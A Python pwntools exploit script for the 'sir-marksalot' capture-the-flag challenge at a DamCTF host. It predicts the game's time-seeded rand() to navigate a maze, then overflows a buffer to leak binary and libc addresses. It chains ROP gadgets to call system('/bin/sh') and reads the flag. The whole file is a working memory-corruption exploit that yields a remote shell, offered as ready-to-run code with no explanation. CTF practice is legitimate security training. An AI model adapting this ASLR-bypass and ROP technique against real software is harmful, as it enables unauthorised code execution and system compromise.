#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./sir-marksalot')

while True:
	context.log_level = 'INFO'

	if args.REMOTE:
		p = remote('chals.damctf.xyz', 31314)
		libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
		binary.address = libc.address = 0
	else:
		p = process(binary.path)
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		binary.address = libc.address = 0

	# pass 1
	from ctypes import *
	glibc = cdll.LoadLibrary('libc.so.6')
	glibc.srand(glibc.time(None))

	log.info('pass 1')
	t = time.time()

	# get started
	p.sendlineafter(b'?\n',b'jump up and down')

	# find myself (array base 1)
	p.sendlineafter(b'): ',b'm')
	x = y = 0

	for i in range(81):
		_ = p.recvline().strip()
		if b'|' in _:
			y += 1
		if b'*' in _:
			x = (2 + _.find(b'*')) // 4
			break

	# check we have a match for the seed
	dy = glibc.rand() % 0x28
	dx = glibc.rand() % 0x28
	log.info('rand {dx},{dy}'.format(dx = dx + 1, dy = dy + 1))
	if x != dx + 1 or y != dy + 1:
		log.critical('rand mismatch')
		p.close()
		continue

	gy = glibc.rand() % 0x28
	gx = glibc.rand() % 0x28
	log.info('grue at {gx},{gy}'.format(gx = gx + 1, gy = gy + 1))

	# lazy, not covering "edge" cases
	if gx == 39 or gy == 39:
		log.critical('grue on edge')
		p.close()
		continue

	# kick down the walls and get to the lower right avoiding grue
	if gx == dx:
		for i in range(40 - x):
			p.sendlineafter(b'): ', b'x')
			p.sendafter(b'?\n', 0x20 * b'\xff')
			p.sendlineafter(b'): ', b'd')

	for j in range(40 - y):
		p.sendlineafter(b'): ', b'x')
		p.sendafter(b'?\n', 0x20 * b'\xff')
		p.sendlineafter(b'): ', b's')

	if gx != dx:
		for i in range(40 - x):
			p.sendlineafter(b'): ', b'x')
			p.sendafter(b'?\n', 0x20 * b'\xff')
			p.sendlineafter(b'): ', b'd')

	log.info('time check: {s}s'.format(s = time.time() - t))

	# lets bust out of here, return to the east
	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'd')

	# canary block, cannot change, but can check for East/West
	_ = p.recvuntil(b'What would you like')
	if b'West' not in _:
		log.critical('cannot backtrack 4')
		p.close()
		continue
	if b'East' not in _:
		log.critical('cannot forwardtrack 2')
		p.close()
		continue

	p.sendlineafter(b'): ', b'd')
	p.recvuntil(b'On the wall is written: ')

	leak = u64(p.recv(6) + b'\0\0')
	log.info('leak: {leak}'.format(leak = hex(leak)))
	binary.address = leak - binary.search(b'jump up and down\n').__next__()
	log.info('binary.address: {loc}'.format(loc = hex(binary.address)))

	pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

	payload1  = b''
	payload1 += 8 * b'\xff'
	payload1 += p64(pop_rdi)
	payload1 += p64(binary.got.puts)
	payload1 += p64(binary.plt.puts)
	if payload1.find(b'\n') != -1:
		log.critical('NL in payload 1')
		p.close()
		continue
	if payload1[28] & 1 == 0:
		log.critical('cannot backtrack 2')
		p.close()
		continue
	if payload1[28] & 4 == 0:
		log.critical('cannot forwardtrack 4')
		p.close()
		continue

	payload2  = b''
	payload2 += p64(binary.sym.main)
	payload2 += 8 * b'\xff'
	payload2 += 8 * b'\xff'
	payload2 += 8 * b'\xff'
	if payload2.find(b'\n') != -1:
		log.critical('NL in payload 2')
		p.close()
		continue

	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'd')

	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', payload1)
	p.sendlineafter(b'): ', b'd')

	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', payload2)
	p.sendlineafter(b'): ', b'a')

	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b'a')

	log.info('time check: {s}s'.format(s = time.time() - t))

	# kick down walls to the grue
	for i in range(39 - gx):
		p.sendlineafter(b'): ', b'x')
		p.sendafter(b'?\n', 0x20 * b'\xff')
		p.sendlineafter(b'): ', b'a')

	for j in range(39 - gy):
		p.sendlineafter(b'): ', b'x')
		p.sendafter(b'?\n', 0x20 * b'\xff')
		p.sendlineafter(b'): ', b'w')

	log.info('time check: {s}s'.format(s = time.time() - t))

	p.recvuntil(b'Grue.\n')

	leak = u64(p.recv(6) + b'\0\0')
	log.info('leak: {leak}'.format(leak = hex(leak)))
	libc.address = leak - libc.sym.puts
	log.info('libc.address: {loc}'.format(loc = hex(libc.address)))

	payload1  = b''
	payload1 += 8 * b'\xff'
	payload1 += p64(pop_rdi+1)
	payload1 += p64(pop_rdi)
	payload1 += p64(libc.search(b'/bin/sh').__next__())
	if payload1.find(b'\n') != -1:
		log.critical('NL in payload 1')
		p.close()
		continue
	if payload1[28] & 4 == 0:
		log.critical('cannot forwardtrack 4')
		p.close()
		continue
	if payload1[28] & 1 == 0:
		log.critical('cannot backtrack 2')
		p.close()
		continue

	payload2  = b''
	payload2 += p64(libc.sym.system)
	payload2 += 8 * b'\xff'
	payload2 += 8 * b'\xff'
	payload2 += 8 * b'\xff'
	if payload2.find(b'\n') != -1:
		log.critical('NL in payload 2')
		p.close()
		continue

	# pass 2
	glibc = cdll.LoadLibrary('libc.so.6')
	glibc.srand(glibc.time(None))

	log.info('pass 2')

	# get started
	p.sendlineafter(b'?\n',b'jump up and down')

	# find myself (base 1)
	p.sendlineafter(b': ',b'm')
	x = y = 0
	for i in range(80):
		_ = p.recvline().strip()
		if b'|' in _:
			y += 1
		if b'*' in _:
			x = (2 + _.find(b'*')) // 4
			break

	log.info('x,y = {x},{y}'.format(x = x, y = y))
	if x == 0:
		log.critical('no * to be found')
		p.close()
		continue

	# check we have a match for the seed
	dy = glibc.rand() % 0x28
	dx = glibc.rand() % 0x28
	log.info('rand {dx},{dy}'.format(dx = dx + 1, dy = dy + 1))
	if x != dx + 1 or y != dy + 1:
		log.critical('rand mismatch')
		p.close()
		continue

	gy = glibc.rand() % 0x28
	gx = glibc.rand() % 0x28
	log.info('grue at {gx},{gy}'.format(gx = gx + 1, gy = gy + 1))

	# lazy, not covering "edge" cases
	if gx == 39 or gy == 39:
		log.critical('grue on edge')
		p.close()
		continue

	# kick down the walls and get to the lower right avoiding grue
	if gx == dx:
		for i in range(40 - x):
			p.sendlineafter(b'): ', b'x')
			p.sendafter(b'?\n', 0x20 * b'\xff')
			p.sendlineafter(b'): ', b'd')

	for j in range(40 - y):
		p.sendlineafter(b'): ', b'x')
		p.sendafter(b'?\n', 0x20 * b'\xff')
		p.sendlineafter(b'): ', b's')

	if gx != dx:
		for i in range(40 - x):
			p.sendlineafter(b'): ', b'x')
			p.sendafter(b'?\n', 0x20 * b'\xff')
			p.sendlineafter(b'): ', b'd')

	log.info('time check: {s}s'.format(s = time.time() - t))

	# lets bust out of here, return to the east
	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'd')

	# canary block, cannot change, but can check for East/West
	_ = p.recvuntil(b'What would you like')
	if b'West' not in _:
		log.critical('cannot backtrack 4')
		p.close()
		continue
	if b'East' not in _:
		log.critical('cannot forwardtrack 2')
		p.close()
		continue

	p.sendlineafter(b'): ', b'd')

	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'd')

	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', payload1)
	p.sendlineafter(b'): ', b'd')

	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', payload2)
	p.sendlineafter(b'): ', b'a')

	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b'a')

	log.info('time check: {s}s'.format(s = time.time() - t))

	# kick down walls to the grue
	for i in range(39 - gx):
		p.sendlineafter(b'): ', b'x')
		p.sendafter(b'?\n', 0x20 * b'\xff')
		p.sendlineafter(b'): ', b'a')
		if time.time() - t >= 59: break
	if time.time() - t >= 59:
		log.critical('out of time')
		p.close()
		continue

	for j in range(39 - gy):
		p.sendlineafter(b'): ', b'x')
		p.sendafter(b'?\n', 0x20 * b'\xff')
		p.sendlineafter(b'): ', b'w')
		if time.time() - t >= 59: break
	if time.time() - t >= 59:
		log.critical('out of time')
		p.close()
		continue

	log.info('time check: {s}s'.format(s = time.time() - t))

	p.recvuntil(b'Grue.\n')
	break

#p.interactive()
p.sendline(b'cat flag')
print(p.recvline().strip().decode())
